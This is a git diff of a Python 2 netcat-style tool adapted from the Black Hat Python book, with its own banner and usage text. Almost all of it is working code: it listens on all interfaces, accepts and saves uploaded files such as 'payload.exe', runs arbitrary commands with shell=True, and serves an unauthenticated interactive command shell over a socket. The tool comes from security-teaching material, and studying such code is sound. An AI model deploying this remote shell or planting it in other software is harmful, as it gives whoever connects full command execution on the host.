@@ -1,11 +1,8 @@
 #!/usr/bin/env python
 
-#From BlackHat Python
-
 import sys,socket,getopt,threading,subprocess
 
-#Defining global variables
-listen              = False
+listen              = False         #Defining global variables
 command             = False
 upload              = False
 execute             = ""
@@ -13,28 +10,26 @@ target              = ""
 upload_destination  = ""
 port                = 0
 
+def banner():
+    print "############   n1cFury- NetCat tool   #################"
+    print "############  courtesy of Black Hat Python  ###########"
+    print ""
 def usage():
-    print "Black Hat Python NetCat tool"
+    print "  USAGE: NetCat.py -t target_host -p port                    "
+    print "-l   --Listen on [host]:[port] for incoming connections      "
+    print "-e   --execute=file_to_run  - execute a file                 "
+    print "-c   --command              - initialize a command shell     "
+    print "-u   --upload = destination - upload a file                  "
+    print "-t   --target    -p  --port                                  "
     print ""
-    print "    Usage: bhpnet.py -t target_host -p port"
-    print "-l   --Listen on [host]:[port] for incoming connections           "
-    print "-e   --execute=file_to_run  - execute a file                      "
-    print "-c   --command              - initialize a command shell          "
-    print "-u   --upload = destination - upload a file to the destination    "
-    print "-t   --target    -p  --port                                       "
-    print ""
-    print "bhpnet.py -t <target> -p 5555 -l -u=c:\\payload.exe               "
-    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
-    print "./bhpnet.py -l -p 9999 -c (listens on port 9999)                  "
-    print "./bhpnet.py -t localhost -p 9999 (targets localhost on port 9999) "
-    print ""
-    #sys.exit(0)
+    print "NetCat.py -t <target> -p 5555 -l -u=c:\\payload.exe          "
+    print "echo 'ABCDEFGHI' | ./NetCat.py -t 192.168.11.12 -p 135       "
+    print "./NetCat.py -l -p <port> (listens on a port)                 "
+    print "./NetCat.py -t <target> -p 9999 -c (CTRL+D opens cmd shell)  "
+    print "Press 'CTRL+D' to initalize shell after connecting           "
 
-def run_command(command):
-    #trim the newline
-    command = command.rstrip()
-
-    #run the command and get the output back
+def run_command(command):               #trim the newline
+    command = command.rstrip()          #run the command and get the output back
     try:
         output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell = True)
     except:
@@ -46,79 +41,56 @@ def client_handler(client_socket):
     global execute
     global command
 
-    #check for upload
-    if len(upload_destination):
-
-        #read in all of the bytes and write to our destination
-        file_buffer = ""
-
-        #keep reading data until none is available
-        while True:
+    if len(upload_destination):             #check for upload
+        file_buffer = ""                    #read in all of the bytes and write to our destination
+        while True:                         #keep reading data until none is available
             data = client_socket.recv(1024)
-
             if not data:
                     break
             else:
-                file_buffer += data
-
-        #now we take these bytes and try to write them out
-        try:
+                file_buffer += data         #now we take these bytes and try to write them out
+        try:                                       
             file_descriptor = open(upload_destination,"wb")
             file_descriptor.write(file_buffer)
             file_descriptor.close()
-
-            #acknowledge that we wrote the file out
-            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
+            client_socket.send("Woohoo! File saved to %s\r\n" % upload_destination)
         except:
-            client_socket.send("Failed to save file to %s\r\n" % upload_destination)
+            client_socket.send("You suck! Your file didn't copy to %s\r\n" % upload_destination)
 
-    #click for command execution
-    if len(execute):
-        #run the command
-        output = run_command(execute)
+    if len(execute):                          #click for command execution
+        output = run_command(execute)        #run the command
         client_socket.send(output)
 
-    #now we go into another loop if a command shell was requested
-    if command:
+    if command:                             #going into a loop if a command shell was requested
         while True:
             prompt = "<BHPNet:#> "
             client_socket.send(prompt)
             cmd_buffer = ""                 #now we receive until we ses a linefeed(enter key)          
             while "\n" not in cmd_buffer:
                 cmd_buffer += client_socket.recv(1024)
-
-            #send back the command output
-            response = run_command(cmd_buffer)
-            #send back the response
-            client_socket.send(response)
+            response = run_command(cmd_buffer)             #send back the command output
+            client_socket.send(response)                   #send back the response
 
 def server_loop():
     global target
     global port
-
-    #if no target is defined, we listen on all interfaces
-    if not len(target):
+    if not len(target):                     #if no target is defined, we listen on all interfaces
         target = "0.0.0.0"
 
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((target,port))
-
     server.listen(5)
 
     while True:
-        client_socket, addr = server.accept()
-
-        #spin off a thread to handle our new client
+        client_socket, addr = server.accept()          #spin off a thread to handle our new client
         client_thread = threading.Thread(target=client_handler, args=(client_socket,))
         client_thread.start()
 
 def client_sender(buffer):
-
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         #connect to our target host
         client.connect((target, port))
-
         if len(buffer):
             client.send(buffer)
 
@@ -140,11 +112,10 @@ def client_sender(buffer):
 
     except:
         print "[*] Exception! Exiting."
-
-        #tear down the connection
-        client.close()
+        client.close()                  #tear down the connection
 
 def main():
+    banner()
     global listen
     global port
     global execute
@@ -154,16 +125,14 @@ def main():
 
     if not len(sys.argv[1:]):
         usage()
-
-    #read the commandline options
-    try:
-        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
+    try:                            #reads command line options
+        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",     
                 ["help","listen","execute","target","port","command","upload"])
     except getopt.GetoptError as err:
         print str(err)
         usage()
 
-    for o,a in opts:
+    for o,a in opts:                    #command options
         if o in ("-h", "--help"):
             usage()
         elif o in ("-l", "--listen"):
@@ -182,15 +151,8 @@ def main():
             assert False, "Unhandled Option"
 
     if not listen and len(target) and port > 0:             #listen or just send data from input
-        #read in the buffer from the commandline
-        #this will block, so send CTRL-D if not sending input
-        #to stdin
         buffer = sys.stdin.read()
-
-        #send data off
         client_sender(buffer)
-    #we are going to listen and potentially upload things, execute commands
-    #and drop a shell back depending on our command line options above
     if listen:
         server_loop()
 if __name__ == "__main__":
